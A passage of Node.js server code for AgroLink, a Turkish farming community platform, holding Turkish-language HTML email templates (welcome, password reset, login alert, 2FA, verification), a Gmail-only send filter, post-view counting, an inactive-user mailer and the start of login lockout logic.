  .feature-text strong{font-size:14px;font-weight:700;color:#e8f5e9;display:block;margin-bottom:2px}
  .feature-text span{font-size:12px;color:rgba(255,255,255,0.45);line-height:1.5}
  /* STATS */
  .stats{display:flex;gap:12px;margin-top:16px}
  .stat-card{flex:1;background:#0a1628;border:1px solid rgba(0,230,118,0.08);border-radius:18px;padding:20px;text-align:center}
  .stat-num{font-size:24px;font-weight:800;background:linear-gradient(135deg,#00e676,#1de9b6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
  .stat-lbl{font-size:11px;color:rgba(255,255,255,0.4);margin-top:4px}
  /* WARNING */
  .warning-box{background:rgba(255,193,7,0.07);border:1px solid rgba(255,193,7,0.2);border-radius:16px;padding:18px 20px;margin-top:16px;display:flex;align-items:flex-start;gap:12px}
  .warning-box .w-icon{font-size:20px;flex-shrink:0;margin-top:1px}
  .warning-box p{font-size:12px;color:rgba(255,255,255,0.55);line-height:1.6}
  .warning-box strong{color:rgba(255,193,7,0.85)}
  /* FOOTER */
  .footer{text-align:center;padding:28px 20px;color:rgba(255,255,255,0.3);font-size:12px;line-height:1.8}
  .footer a{color:rgba(0,230,118,0.7);text-decoration:none}
  .divider{width:40px;height:2px;background:linear-gradient(90deg,#00e676,#1de9b6);border-radius:2px;margin:20px auto}
</style>
</head>
<body>
<div class="wrapper">
  <!-- HERO -->
  <div class="hero">
    <div class="logo-box"><img src="https://sehitumitkestitarimmtal.com/agro.png" alt="AgroLink"></div>
    <div class="brand">AgroLink</div>
    <div class="tagline">Dijital Tarım Topluluğu</div>
    <div class="hero-greeting">Hoş geldin, <span>${name}</span>! 🌱</div>
    <div class="hero-sub">
      Hesabın başarıyla oluşturuldu. Artık Türkiye'nin tarım ekosistemine bağlandın.
    </div>
    <a href="https://sehitumitkestitarimmtal.com" class="cta-btn">Platforma Git →</a>
  </div>

  <!-- FEATURES -->
  <div class="section">
    <div class="section-title">🚀 Seni Neler Bekliyor?</div>
    <div class="feature-item">
      <div class="feature-icon">🌾</div>
      <div class="feature-text">
        <strong>Tarım Odaklı Feed</strong>
        <span>Çiftçiler, ziraat mühendisleri ve üreticilerle paylaşım yap, içerik üret, bilgi al.</span>
      </div>
    </div>
    <div class="feature-item">
      <div class="feature-icon">🤝</div>
      <div class="feature-text">
        <strong>Dijital İmece</strong>
        <span>Üreticilerle bağlantı kur, sorularını sor, deneyimlerini paylaş.</span>
      </div>
    </div>
    <div class="feature-item">
      <div class="feature-icon">🛒</div>
      <div class="feature-text">
        <strong>Pazar Yeri</strong>
        <span>Tarımsal ürünlerini sat, al, komşu üreticilerle ticaret yap.</span>
      </div>
    </div>
    <div class="feature-item">
      <div class="feature-icon">📊</div>
      <div class="feature-text">
        <strong>Çiftlik Defteri</strong>
        <span>Tarım faaliyetlerini dijital ortamda kaydet ve takip et.</span>
      </div>
    </div>
    <div class="feature-item">
      <div class="feature-icon">🔔</div>
      <div class="feature-text">
        <strong>Anlık Bildirimler</strong>
        <span>Takip ettiklerinin paylaşımlarını ve önemli duyuruları kaçırma.</span>
      </div>
    </div>
  </div>

  <!-- STATS -->
  <div class="stats">
    <div class="stat-card">
      <div class="stat-num">500+</div>
      <div class="stat-lbl">Aktif Üye</div>
    </div>
    <div class="stat-card">
      <div class="stat-num">1.2K+</div>
      <div class="stat-lbl">Paylaşım</div>
    </div>
    <div class="stat-card">
      <div class="stat-num">7/24</div>
      <div class="stat-lbl">Canlı Destek</div>
    </div>
  </div>

  <!-- WARNING -->
  <div class="warning-box">
    <div class="w-icon">⚠️</div>
    <p><strong>Önemli:</strong> Bu e-posta adresine güvenlik bildirimleri, şifre sıfırlama ve sistem duyuruları gönderilecektir. E-posta adresini başkasıyla paylaşma. Şüpheli bir durum fark edersen hesabındaki güvenlik seçeneklerini kullan.</p>
  </div>

  <div class="divider"></div>

  <!-- FOOTER -->
  <div class="footer">
    <p><strong style="color:rgba(0,230,118,0.8)">AgroLink Ekibi</strong></p>
    <p>Bereketli, verimli ve güçlü bir dijital tarım yolculuğu dileriz 🌿</p>
    <br>
    <p>Bu e-posta otomatik gönderilmiştir. Lütfen yanıtlamayınız.</p>
    <p>&copy; ${year} AgroLink · <a href="https://sehitumitkestitarimmtal.com">sehitumitkestitarimmtal.com</a></p>
  </div>
</div>
</body>
</html>`;
}
async function sendWelcomeEmail(userEmail, userName) {
    return sendEmail(userEmail, "🌾 Agrolink'e Hoş Geldiniz!", getWelcomeEmailTemplate(userName));
}

async function sendLoginNotificationEmail(userEmail, userName, req, resetToken = null) {
    const now = new Date();
    const ip  = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Bilinmiyor';
    const loginDetails = {
        date    : now.toLocaleDateString('tr-TR', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' }),
        time    : now.toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
        ip,
        device  : detectDeviceFromUserAgent(req.headers['user-agent'] || ''),
        location: null,
    };
    return sendEmail(userEmail, '🔐 Agrolink Hesabınıza Giriş Yapıldı', getLoginNotificationTemplate(userName, loginDetails, resetToken));
}

async function sendPasswordResetSuccessEmail(userEmail, userName) {
    return sendEmail(userEmail, '✅ Agrolink - Şifreniz Başarıyla Sıfırlandı!', getPasswordResetSuccessTemplate(userName));
}

// ──────────────────────────────────────────────────────────────────────────────
// 🔑 ŞİFRE SIFIRLAMA E-POSTA TEMPLATE (KAYIP OLAN)
// ──────────────────────────────────────────────────────────────────────────────
function getForgotPasswordEmailTemplate(userName, resetToken) {
    userName = escapeHtml(userName);
    const year       = new Date().getFullYear();
    const name       = userName || 'Değerli Üye';
    const DOMAIN     = process.env.APP_URL || 'https://sehitumitkestitarimmtal.com';
    // Kullanıcı bu linke tıklayınca /api/auth/reset-password-direct?token=... sayfasına gider.
    // O sayfa şifre sıfırlama formunu gösterir ve token DB'den doğrulanır.
    // 🔒 Token URL'de — email istemcisi Referer göndermez (HTTPS→HTTPS redirect yok)
    // 🔒 Güvenlik: Referrer-Policy no-referrer header ile token dış sitelere sızmaz
    // /api/auth/reset-password-direct sunucu tarafında HTML form render eder
    const resetLink  = `${DOMAIN}/api/auth/reset-password-direct?token=${resetToken}`;
    return `<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Şifre Sıfırlama - AgroLink</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:'Segoe UI',Arial,sans-serif;background:#060d0a;color:#e8f5e9;-webkit-font-smoothing:antialiased}
  .wrapper{max-width:600px;margin:0 auto;padding:24px 16px}
  .hero{background:linear-gradient(135deg,#0a1f10 0%,#0d2b16 40%,#071a0c 100%);border-radius:28px;padding:48px 40px;text-align:center;border:1px solid rgba(0,230,118,0.15)}
  .logo-box{width:72px;height:72px;border-radius:20px;margin:0 auto 16px;overflow:hidden;border:2px solid rgba(0,230,118,0.3);box-shadow:0 0 0 8px rgba(0,230,118,0.06)}
  .logo-box img{width:100%;height:100%;object-fit:cover}
  .brand{font-size:28px;font-weight:800;background:linear-gradient(135deg,#00e676,#1de9b6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
  .hero-title{font-size:20px;font-weight:700;color:#e8f5e9;margin-top:24px}
  .hero-sub{font-size:14px;color:rgba(255,255,255,0.55);margin-top:8px;line-height:1.6}
  .cta-btn{display:inline-block;margin-top:28px;padding:16px 40px;background:linear-gradient(135deg,#00e676,#1de9b6);color:#020810;font-weight:800;font-size:15px;border-radius:50px;text-decoration:none;letter-spacing:0.3px;box-shadow:0 8px 32px rgba(0,230,118,0.3)}
  .info-box{background:#0a1628;border:1px solid rgba(0,230,118,0.08);border-radius:20px;padding:24px;margin-top:16px}
  .info-row{display:flex;align-items:flex-start;gap:12px;padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.04)}
  .info-row:last-child{border-bottom:none}
  .info-icon{font-size:18px;flex-shrink:0;margin-top:2px}
  .info-text{font-size:13px;color:rgba(255,255,255,0.55);line-height:1.6}
  .info-text strong{color:#e8f5e9}
  .warning{background:rgba(255,87,34,0.07);border:1px solid rgba(255,87,34,0.2);border-radius:16px;padding:16px 20px;margin-top:16px;font-size:12px;color:rgba(255,255,255,0.5);line-height:1.7}
  .warning strong{color:rgba(255,100,60,0.9)}
  .url-box{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:12px;padding:12px 16px;margin-top:16px;word-break:break-all;font-size:11px;color:rgba(255,255,255,0.35);font-family:monospace}
  .footer{text-align:center;padding:28px 20px;color:rgba(255,255,255,0.3);font-size:12px;line-height:1.8}
  .footer a{color:rgba(0,230,118,0.7);text-decoration:none}
</style>
</head>
<body>
<div class="wrapper">
  <div class="hero">
    <div class="logo-box"><img src="${DOMAIN}/agro.png" alt="AgroLink" onerror="this.style.display='none'"></div>
    <div class="brand">AgroLink</div>
    <div class="hero-title">🔑 Şifre Sıfırlama Talebi</div>
    <p class="hero-sub">Merhaba <strong style="color:#00e676">${name}</strong>, hesabınız için şifre sıfırlama talebinde bulundunuz.</p>
    <a href="${resetLink}" class="cta-btn">Şifremi Sıfırla →</a>
  </div>

  <div class="info-box">
    <div class="info-row">
      <span class="info-icon">⏰</span>
      <div class="info-text"><strong>Geçerlilik Süresi</strong><br>Bu bağlantı <strong>10 dakika</strong> sonra geçersiz olacaktır.</div>
    </div>
    <div class="info-row">
      <span class="info-icon">🔒</span>
      <div class="info-text"><strong>Tek Kullanımlık</strong><br>Bağlantıya tıkladıktan sonra artık kullanılamayacaktır.</div>
    </div>
    <div class="info-row">
      <span class="info-icon">📵</span>
      <div class="info-text"><strong>Talep Etmediyseniz</strong><br>Bu e-postayı dikkate almayın. Şifreniz değişmeyecektir.</div>
    </div>
  </div>

  <div class="warning">
    <strong>⚠️ Güvenlik Uyarısı:</strong> AgroLink ekibi sizden hiçbir zaman şifrenizi, bu bağlantıyı veya doğrulama kodunuzu telefon/mesaj yoluyla istemez. Bağlantıyı başkasıyla paylaşmayın.
  </div>

  <p style="font-size:12px;color:rgba(255,255,255,0.25);margin-top:16px">Butona tıklanamıyorsa aşağıdaki adresi tarayıcınıza kopyalayın:</p>
  <div class="url-box">[Güvenlik nedeniyle bağlantı sadece butona tıklanarak kullanılabilir]</div>

  <div class="footer">
    <p><strong style="color:rgba(0,230,118,0.8)">AgroLink Güvenlik Ekibi</strong></p>
    <p>Bu e-posta otomatik gönderilmiştir. Lütfen yanıtlamayınız.</p>
    <p>&copy; ${year} AgroLink · <a href="${DOMAIN}">${DOMAIN.replace('https://','')}</a></p>
  </div>
</div>
</body>
</html>`;
}

// ──────────────────────────────────────────────────────────────────────────────
// ✅ ŞİFRE SIFIRLAMA BAŞARILI TEMPLATE (KAYIP OLAN)
// ──────────────────────────────────────────────────────────────────────────────
function getPasswordResetSuccessTemplate(userName) {
    const year   = new Date().getFullYear();
    const name   = userName || 'Değerli Üye';
    const DOMAIN = process.env.APP_URL || 'https://sehitumitkestitarimmtal.com';
    return `<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<title>Şifre Değiştirildi - AgroLink</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:'Segoe UI',Arial,sans-serif;background:#060d0a;color:#e8f5e9}
  .wrapper{max-width:600px;margin:0 auto;padding:24px 16px}
  .hero{background:linear-gradient(135deg,#0a1f10,#0d2b16);border-radius:28px;padding:48px 40px;text-align:center;border:1px solid rgba(0,230,118,0.15)}
  .icon{font-size:56px;margin-bottom:16px}
  .brand{font-size:26px;font-weight:800;color:#00e676}
  .title{font-size:20px;font-weight:700;margin-top:20px}
  .sub{font-size:14px;color:rgba(255,255,255,0.55);margin-top:8px;line-height:1.6}
  .cta{display:inline-block;margin-top:24px;padding:14px 36px;background:linear-gradient(135deg,#00e676,#1de9b6);color:#020810;font-weight:800;border-radius:50px;text-decoration:none}
  .warning{background:rgba(255,87,34,0.07);border:1px solid rgba(255,87,34,0.2);border-radius:16px;padding:16px 20px;margin-top:16px;font-size:12px;color:rgba(255,255,255,0.5);line-height:1.7}
  .footer{text-align:center;padding:24px 20px;color:rgba(255,255,255,0.3);font-size:12px}
  .footer a{color:rgba(0,230,118,0.7);text-decoration:none}
</style>
</head>
<body>
<div class="wrapper">
  <div class="hero">
    <div class="icon">✅</div>
    <div class="brand">AgroLink</div>
    <div class="title">Şifreniz Başarıyla Değiştirildi</div>
    <p class="sub">Merhaba <strong style="color:#00e676">${name}</strong>, hesabınızın şifresi başarıyla güncellendi.</p>
    <a href="${DOMAIN}" class="cta">Giriş Yap →</a>
  </div>
  <div class="warning">
    <strong>⚠️ Bu değişikliği siz yapmadıysanız</strong> hemen <a href="${DOMAIN}" style="color:#ff6b35">AgroLink</a>'e giriş yapın ve şifrenizi tekrar değiştirin. Güvenliğiniz için destek ekibimizle iletişime geçin.
  </div>
  <div class="footer">
    <p><strong style="color:rgba(0,230,118,0.8)">AgroLink Güvenlik Ekibi</strong></p>
    <p>&copy; ${year} AgroLink · <a href="${DOMAIN}">${DOMAIN.replace('https://','')}</a></p>
  </div>
</div>
</body>
</html>`;
}

// ──────────────────────────────────────────────────────────────────────────────
// 🔐 GİRİŞ BİLDİRİM TEMPLATE (KAYIP OLAN)
// ──────────────────────────────────────────────────────────────────────────────
function getLoginNotificationTemplate(userName, loginDetails, resetToken = null) {
    userName = escapeHtml(userName);
    const year   = new Date().getFullYear();
    const name   = userName || 'Değerli Üye';
    const DOMAIN = process.env.APP_URL || 'https://sehitumitkestitarimmtal.com';
    const resetSection = resetToken ? `
    <div style="background:rgba(255,152,0,0.08);border:1px solid rgba(255,152,0,0.2);border-radius:14px;padding:16px 20px;margin-top:16px;font-size:13px;color:rgba(255,255,255,0.6);line-height:1.7">
      <strong style="color:rgba(255,165,0,0.9)">🔑 Şüpheli Giriş mi?</strong><br>
      Bu girişi siz yapmadıysanız <a href="${DOMAIN}/api/auth/reset-password-direct?token=${resetToken}" style="color:#00e676;font-weight:700">buraya tıklayarak</a> şifrenizi hemen sıfırlayın.
    </div>` : '';
    return `<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<title>Giriş Bildirimi - AgroLink</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:'Segoe UI',Arial,sans-serif;background:#060d0a;color:#e8f5e9}
  .wrapper{max-width:600px;margin:0 auto;padding:24px 16px}
  .hero{background:linear-gradient(135deg,#0a1f10,#0d2b16);border-radius:28px;padding:40px;text-align:center;border:1px solid rgba(0,230,118,0.15)}
  .brand{font-size:26px;font-weight:800;color:#00e676}
  .title{font-size:18px;font-weight:700;margin-top:20px}
  .info-box{background:#0a1628;border:1px solid rgba(0,230,118,0.08);border-radius:20px;padding:24px;margin-top:16px}
  .info-row{padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.04);font-size:13px;color:rgba(255,255,255,0.55)}
  .info-row:last-child{border-bottom:none}
  .info-row strong{color:#e8f5e9}
  .footer{text-align:center;padding:24px 20px;color:rgba(255,255,255,0.3);font-size:12px}
  .footer a{color:rgba(0,230,118,0.7);text-decoration:none}
</style>
</head>
<body>
<div class="wrapper">
  <div class="hero">
    <div class="brand">AgroLink</div>
    <div class="title">🔐 Hesabınıza Giriş Yapıldı</div>
    <p style="font-size:14px;color:rgba(255,255,255,0.55);margin-top:8px">Merhaba <strong style="color:#00e676">${name}</strong></p>
  </div>
  <div class="info-box">
    <div class="info-row"><strong>📅 Tarih:</strong> ${loginDetails?.date || 'Bilinmiyor'}</div>
    <div class="info-row"><strong>🕐 Saat:</strong> ${loginDetails?.time || 'Bilinmiyor'}</div>
    <div class="info-row"><strong>🌐 IP:</strong> ${loginDetails?.ip || 'Bilinmiyor'}</div>
    <div class="info-row"><strong>📱 Cihaz:</strong> ${loginDetails?.device || 'Bilinmiyor'}</div>
  </div>
  ${resetSection}
  <div class="footer">
    <p>&copy; ${year} AgroLink · <a href="${DOMAIN}">${DOMAIN.replace('https://','')}</a></p>
  </div>
</div>
</body>
</html>`;
}

// ──────────────────────────────────────────────────────────────────────────────
// 🌿 PASİF KULLANICI TEMPLATE (KAYIP OLAN)
// ──────────────────────────────────────────────────────────────────────────────
function getInactiveUserEmailTemplate(userName, userId) {
    userName = escapeHtml(userName);
    const year   = new Date().getFullYear();
    const name   = userName || 'Değerli Üye';
    const DOMAIN = process.env.APP_URL || 'https://sehitumitkestitarimmtal.com';
    return `<!DOCTYPE html>
<html lang="tr">
<head><meta charset="UTF-8"><title>Seni Özledik - AgroLink</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Arial,sans-serif;background:#060d0a;color:#e8f5e9}.wrapper{max-width:600px;margin:0 auto;padding:24px 16px}.hero{background:linear-gradient(135deg,#0a1f10,#0d2b16);border-radius:28px;padding:48px 40px;text-align:center;border:1px solid rgba(0,230,118,0.15)}.brand{font-size:26px;font-weight:800;color:#00e676}.cta{display:inline-block;margin-top:24px;padding:14px 36px;background:linear-gradient(135deg,#00e676,#1de9b6);color:#020810;font-weight:800;border-radius:50px;text-decoration:none}.footer{text-align:center;padding:24px 20px;color:rgba(255,255,255,0.3);font-size:12px}.footer a{color:rgba(0,230,118,0.7);text-decoration:none}</style>
</head>
<body><div class="wrapper">
  <div class="hero">
    <div style="font-size:52px;margin-bottom:16px">🌿</div>
    <div class="brand">AgroLink</div>
    <h2 style="font-size:20px;margin-top:20px">Seni Özledik, ${name}!</h2>
    <p style="font-size:14px;color:rgba(255,255,255,0.55);margin-top:10px;line-height:1.6">Bir süredir aramızda değilsin. Tarım topluluğu seni bekliyor!</p>
    <a href="${DOMAIN}" class="cta">Geri Dön →</a>
  </div>
  <div class="footer"><p>&copy; ${year} AgroLink · <a href="${DOMAIN}">${DOMAIN.replace('https://','')}</a></p></div>
</div></body></html>`;
}

// ──────────────────────────────────────────────────────────────────────────────
// 💚 YÜKSEK ETKİLEŞİM TEMPLATE (KAYIP OLAN)
// ──────────────────────────────────────────────────────────────────────────────
function getHighEngagementEmailTemplate(userName, userId) {
    userName = escapeHtml(userName);
    const year   = new Date().getFullYear();
    const name   = userName || 'Değerli Üye';
    const DOMAIN = process.env.APP_URL || 'https://sehitumitkestitarimmtal.com';
    return `<!DOCTYPE html>
<html lang="tr">
<head><meta charset="UTF-8"><title>Teşekkürler - AgroLink</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Arial,sans-serif;background:#060d0a;color:#e8f5e9}.wrapper{max-width:600px;margin:0 auto;padding:24px 16px}.hero{background:linear-gradient(135deg,#0a1f10,#0d2b16);border-radius:28px;padding:48px 40px;text-align:center;border:1px solid rgba(0,230,118,0.15)}.brand{font-size:26px;font-weight:800;color:#00e676}.cta{display:inline-block;margin-top:24px;padding:14px 36px;background:linear-gradient(135deg,#00e676,#1de9b6);color:#020810;font-weight:800;border-radius:50px;text-decoration:none}.footer{text-align:center;padding:24px 20px;color:rgba(255,255,255,0.3);font-size:12px}.footer a{color:rgba(0,230,118,0.7);text-decoration:none}</style>
</head>
<body><div class="wrapper">
  <div class="hero">
    <div style="font-size:52px;margin-bottom:16px">💚</div>
    <div class="brand">AgroLink</div>
    <h2 style="font-size:20px;margin-top:20px">Teşekkür Ederiz, ${name}!</h2>
    <p style="font-size:14px;color:rgba(255,255,255,0.55);margin-top:10px;line-height:1.6">Topluluğa yaptığın katkılar harika! Paylaşımların çok beğeniliyor.</p>
    <a href="${DOMAIN}" class="cta">Profili Gör →</a>
  </div>
  <div class="footer"><p>&copy; ${year} AgroLink · <a href="${DOMAIN}">${DOMAIN.replace('https://','')}</a></p></div>
</div></body></html>`;
}

// ══════════════════════════════════════════════════════════════════
// 📧 GMAIL ONLY — Sadece @gmail.com adreslerine e-posta gönder
// Diğer adresler sessizce atlanır (hata verilmez, kayıt devam eder)
// ══════════════════════════════════════════════════════════════════
function isGmailAddress(email) {
    return typeof email === 'string' && email.toLowerCase().trim().endsWith('@gmail.com');
}

async function sendEmailIfGmail(to, subject, html, text = null) {
    if (!isGmailAddress(to)) {
        console.log(`📧 [GMAIL-ONLY] Atlandı (gmail değil): ${to.replace(/(.{2}).*(@)/, '$1***$2')}`);
        return { success: false, skipped: true, reason: 'Sadece @gmail.com adresleri desteklenir' };
    }
    return sendEmail(to, subject, html, text);
}


async function sendForgotPasswordEmail(userEmail, userName, resetToken) {
    if (!isGmailAddress(userEmail)) return { success: true, skipped: true };
    return sendEmail(userEmail, '🔑 Agrolink - Şifre Sıfırlama Talebi', getForgotPasswordEmailTemplate(userName, resetToken));
}

async function sendInactiveUserEmail(userId, userEmail, userName) {
    if (!isGmailAddress(userEmail)) return { success: true, skipped: true };
    return sendEmail(userEmail, '🌿 Agrolink - Seni Özledik!', getInactiveUserEmailTemplate(userName, userId));
}

async function sendHighEngagementEmail(userId, userEmail, userName) {
    if (!isGmailAddress(userEmail)) return { success: true, skipped: true };
    return sendEmail(userEmail, '💚 Agrolink - Teşekkür Ederiz!', getHighEngagementEmailTemplate(userName, userId));
}

// ─── 2FA E-POSTA ŞABLONU ─────────────────────────────────────────────
function getTwoFactorEmailTemplate(userName, code, purpose = 'login') {
    userName = escapeHtml(userName);
    const purposeText = purpose === 'login' ? 'giriş işleminizi' : 'işleminizi';
    return `<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Doğrulama Kodu - Agrolink</title>
<style>
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;line-height:1.8;color:#333;margin:0;padding:0;background-color:#f4f4f4}
.container{max-width:600px;margin:20px auto;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,.1)}
.header{background:linear-gradient(135deg,#2e7d32,#4caf50);padding:40px 30px;text-align:center}
.header h1{color:#fff;margin:0;font-size:28px}
.content{padding:40px 30px}
.code-box{background:linear-gradient(135deg,#e8f5e9,#c8e6c9);padding:30px;border-radius:12px;text-align:center;margin:25px 0;border:2px dashed #4caf50}
.code{font-size:42px;font-weight:bold;color:#2e7d32;letter-spacing:8px;font-family:'Courier New',monospace}
.timer-box{background:#fff8e1;padding:20px;border-radius:8px;margin:20px 0;border-left:4px solid #ffc107;text-align:center}
.timer{font-size:24px;font-weight:bold;color:#f57c00}
.warning{background:#ffebee;padding:20px;border-radius:8px;margin:20px 0;border-left:4px solid #f44336}
.footer{background:#f5f5f5;padding:25px 30px;text-align:center;color:#666;font-size:13px}
.logo-emoji{font-size:48px;margin-bottom:10px}
</style></head><body>
<div class="container">
  <div class="header"><div class="logo-emoji">🔐</div><h1>Doğrulama Kodu</h1></div>
  <div class="content">
    <h2>Merhaba ${userName || 'Değerli Kullanıcı'},</h2>
    <p>Agrolink hesabınıza ${purposeText} tamamlamak için doğrulama kodunuz:</p>
    <div class="code-box"><div class="code">${code}</div></div>
    <div class="timer-box"><p style="margin:0 0 10px 0">⏱️ Bu kodun geçerlilik süresi:</p><div class="timer">5 DAKİKA</div></div>
    <div class="warning"><strong>⚠️ Güvenlik Uyarısı:</strong><p style="margin:10px 0 0 0">Bu kodu kimseyle paylaşmayın. Agrolink çalışanları asla bu kodu sizden istemez.</p></div>
    <p>Eğer bu işlemi siz yapmadıysanız, hesabınızın güvenliği için şifrenizi hemen değiştirin.</p>
    <p>Saygılarımızla,<br><strong>Agrolink Güvenlik Ekibi</strong></p>
  </div>
  <div class="footer"><p>Bu e-posta otomatik olarak gönderilmiştir. Lütfen yanıtlamayınız.</p><p>&copy; ${new Date().getFullYear()} Agrolink. Tüm hakları saklıdır.</p></div>
</div></body></html>`;
}

async function sendTwoFactorCodeEmail(userEmail, userName, code, purpose = 'login') {
    try {
        // Gmail değilse sessizce geç — skipped:true, error yok
        if (!isGmailAddress(userEmail)) {
            return { success: true, skipped: true };
        }
        const html = getTwoFactorEmailTemplate(userName, code, purpose);
        return await sendEmail(userEmail, '🔐 Agrolink Doğrulama Kodunuz', html);
    } catch (error) {
        console.error('2FA e-postası gönderilemedi:', error.message);
        return { success: false, error: error.message || 'E-posta gönderilemedi' };
    }
}

// ─── KAYIT DOĞRULAMA E-POSTA ŞABLONU ─────────────────────────────────
function getEmailVerificationTemplate(userName, code) {
    userName = escapeHtml(userName);
    return `<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>E-Posta Doğrulama - Agrolink</title>
<style>
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;line-height:1.8;color:#333;margin:0;padding:0;background-color:#f4f4f4}
.container{max-width:600px;margin:20px auto;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,.1)}
.header{background:linear-gradient(135deg,#1976d2,#42a5f5);padding:40px 30px;text-align:center}
.header h1{color:#fff;margin:0;font-size:28px}
.content{padding:40px 30px}
.code-box{background:linear-gradient(135deg,#e3f2fd,#bbdefb);padding:30px;border-radius:12px;text-align:center;margin:25px 0;border:2px dashed #1976d2}
.code{font-size:42px;font-weight:bold;color:#1565c0;letter-spacing:8px;font-family:'Courier New',monospace}
.timer-box{background:#fff8e1;padding:20px;border-radius:8px;margin:20px 0;border-left:4px solid #ffc107;text-align:center}
.timer{font-size:24px;font-weight:bold;color:#f57c00}
.info-box{background:#e8f5e9;padding:20px;border-radius:8px;margin:20px 0;border-left:4px solid #4caf50}
.footer{background:#f5f5f5;padding:25px 30px;text-align:center;color:#666;font-size:13px}
.logo-emoji{font-size:48px;margin-bottom:10px}
</style></head><body>
<div class="container">
  <div class="header"><div class="logo-emoji">✉️</div><h1>E-Posta Doğrulama</h1></div>
  <div class="content">
    <h2>Merhaba ${userName || 'Değerli Kullanıcı'},</h2>
    <p>Agrolink hesabınızı oluşturduğunuz için teşekkür ederiz! E-posta adresinizi doğrulamak için aşağıdaki kodu kullanın:</p>
    <div class="code-box"><div class="code">${code}</div></div>
    <div class="timer-box"><p style="margin:0 0 10px 0">⏱️ Bu kodun geçerlilik süresi:</p><div class="timer">15 DAKİKA</div></div>
    <div class="info-box"><strong>✅ Neden doğrulama gerekiyor?</strong><p style="margin:10px 0 0 0">E-posta doğrulaması, hesabınızın güvenliğini artırır ve size önemli bildirimlerin ulaşmasını sağlar.</p></div>
    <p>Eğer bu işlemi siz yapmadıysanız, bu e-postayı dikkate almayın.</p>
    <p>Saygılarımızla,<br><strong>Agrolink Ekibi</strong></p>
  </div>
  <div class="footer"><p>Bu e-posta otomatik olarak gönderilmiştir. Lütfen yanıtlamayınız.</p><p>&copy; ${new Date().getFullYear()} Agrolink. Tüm hakları saklıdır.</p></div>
</div></body></html>`;
}

// ==================== POST GÖRÜNTÜLEME SİSTEMİ ====================

async function incrementPostView(postId, userId, ip) {
    try {
        const today = new Date().toISOString().slice(0, 10); // YYYY-MM-DD

        // Bugün bu kullanıcı bu postu gördü mü?
        const existing = await dbGet(
            `SELECT id FROM post_views WHERE "postId" = $1 AND "userId" = $2 AND "viewDate" = $3`,
            [postId, userId, today]
        );

        if (!existing) {
            // Yeni görüntüleme kaydı
            await dbRun(
                `INSERT INTO post_views (id, "postId", "userId", ip, "viewDate")
                 VALUES ($1, $2, $3, $4, $5)
                 ON CONFLICT ("postId", "userId", "viewDate") DO NOTHING`,
                [uuidv4(), postId, userId, ip || '', today]
            );
            // Sayacı artır
            await dbRun('UPDATE posts SET views = COALESCE(views, 0) + 1 WHERE id = $1', [postId]);
        }
    } catch (err) {
        console.error('incrementPostView hatası:', err.message);
        // Fallback: basit artırım
        try { await dbRun('UPDATE posts SET views = COALESCE(views, 0) + 1 WHERE id = $1', [postId]); } catch {}
    }
}

async function sendEmailVerificationCode(userEmail, userName, code) {
    try {
        const html = getEmailVerificationTemplate(userName, code);
        if (!isGmailAddress(userEmail)) return { success: true, skipped: true };
        return await sendEmail(userEmail, '✉️ Agrolink - E-Posta Doğrulama Kodunuz', html);
    } catch (error) {
        console.error('E-posta doğrulama e-postası gönderilemedi:', error);
        return { success: false, error: error.message };
    }
}

// ─── Periyodik: 7 gün aktif olmayan kullanıcılara e-posta ───────────
async function checkInactiveUsers() {
    try {
        console.log('🔍 İnaktif kullanıcılar kontrol ediliyor...');
        const inactiveUsers = await dbAll(
            `SELECT id, email, name FROM users
             WHERE "isActive" = TRUE
               AND "lastSeen" < NOW() - INTERVAL '7 days'
               AND "lastSeen" > NOW() - INTERVAL '30 days'`,
            []
        );
        console.log(`📊 ${inactiveUsers.length} inaktif kullanıcı bulundu`);
        for (const user of inactiveUsers) {
            await sendInactiveUserEmail(user.id, user.email, user.name);
            await new Promise(r => setTimeout(r, 2000)); // rate limiting
        }
        console.log('✅ İnaktif kullanıcı kontrolü tamamlandı');
    } catch (error) {
        console.error('İnaktif kullanıcı kontrol hatası:', error);
    }
}
// Her gün saat 09:00'da çalıştır (24 * 60 * 60 * 1000 ms)
setInterval(checkInactiveUsers, 24 * 60 * 60 * 1000);

// ==================== 🔒 BRUTE FORCE KORUMASI ====================

const accountFailedAttempts = new Map();
const MAX_FAILED_LOGINS    = 10;
const LOCKOUT_DURATION_MS  = 15 * 60 * 1000;

// 🔒 NOT: Lockout sayaçları bellek tabanlıdır (cluster'da bölünür).
// loginLimiter (express-rate-limit) DB/Redis destekli değil — production'da Redis store ekleyin.
function checkAccountLockout(identifier) {
    const key   = identifier.toLowerCase().trim();
    const entry = accountFailedAttempts.get(key);
    if (!entry) return { locked: false };
    if (entry.lockedUntil && Date.now() < entry.lockedUntil) {
        return { locked: true, remainingMin: Math.ceil((entry.lockedUntil - Date.now()) / 60000) };
    }
